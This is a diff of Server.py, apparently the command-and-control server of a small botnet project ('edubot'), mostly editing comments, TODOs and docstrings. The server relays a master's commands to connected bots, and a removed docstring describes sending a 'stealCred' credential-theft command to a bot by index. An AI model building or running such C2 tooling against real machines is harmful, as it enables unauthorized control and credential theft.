@@ -1,11 +1,19 @@
 """
-TODO 
-    - Think about creating a static class for Server 
-        - (list) bots: List of bots 
-        - (function) sendCommand 
-        - (function) updateBots
-        - (funciton) checkBotConnection
-        - etc...
+
+Author: Sunggwan Choi 
+
+Description: Server.py is the server which handles all the bot connection. 
+It's main purpose is to send commands from the master to the connected bots, 
+and retrieve result from the bots. 
+
+Server.py is barely finished.
+
+TODO: 
+    - Create a class for server. For the love of god stop using global variables.
+    - Please stop cooking spaghetti 
+    - Need argparse to parse commandline options 
+    - Create a parse command function 
+    - Add more functionality to the cli of the server. 
 
 """
 
@@ -28,8 +36,7 @@ class Bot:
     def prettyPrint(self):
         return "\n["+str(self.idx)+"] "+self.ip+":"+str(self.port)
 
-# List of bots 
-# ip ban? 
+# TODO: Implement this 
 class Server:
     def __init__(self, bots, idx, socketz, threads):
         pass
@@ -44,16 +51,8 @@ Param:
 """
 def individual_bot_sock(bot,sock):
     while True:       
-        # TODO: Couldn't this just have bot as a param?? 
         data = sock.recv(1024).decode()
         print (data)
-
-        #except Exception as err:
-        #    print("[-] Bot disconnected.")
-        #    bots.remove(bot)
-        #    for bot in bots:
-        #        bot.idx -= 1
-        #    break
 
         if not data:
             print("[-] Bot disconnected.")
@@ -129,14 +128,6 @@ def checkConnection(sock):
         print("[DEBUG] connection not edubot. Closing socket.")
         #sock.close() # TODO uncomment!
         return 1
-
-"""
-Name: parseCommand
-Description: Parse of the command of the master and determine which function/module 
-to use. 
-ex) 10 stealCred --> ['10', [stealCred'] --> to index "10" bot, send "stealCred"
-command, which uses the stealCred module 
-"""
 
 """
 Name: sendCommand
@@ -293,9 +284,13 @@ def serverSetup(port):
 
     return sock
 
-#######################################################
-#                    Start of Main 
-#######################################################
+
+
+
+
+###################################################################
+#                          Start of Main 
+###################################################################
 
 # Global variables because I am a bad programmer. 
 # TODO: But really, need refactoring of this part 
